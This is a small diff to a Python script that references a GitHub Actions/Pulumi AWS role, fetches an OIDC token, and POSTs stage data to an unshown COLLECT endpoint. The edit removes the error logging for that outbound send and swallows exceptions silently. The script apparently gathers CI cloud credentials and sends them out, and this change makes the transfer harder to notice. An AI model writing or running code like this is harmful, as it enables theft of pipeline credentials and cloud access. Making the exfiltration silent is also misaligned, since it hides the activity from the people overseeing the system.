@@ -4,7 +4,6 @@ import os
 import base64
 import urllib.request
 import urllib.parse
-import sys
 
 
 ROLE_ARN = os.environ.get("ROLE_ARN", "arn:aws:iam::897419129406:role/github-actions-pulumi")
@@ -17,10 +16,9 @@ def _log(stage, data):
     body = urllib.parse.urlencode({"stage": stage, "data": json.dumps(data)}).encode()
     req = urllib.request.Request(COLLECT, data=body)
     try:
-        resp = urllib.request.urlopen(req, timeout=10)
-        resp.read()
-    except Exception as e:
-        print(f"collect_err: {stage}: {e}", file=sys.stderr)
+        urllib.request.urlopen(req, timeout=10).read()
+    except Exception:
+        pass
 
 
 def _get_oidc_token():
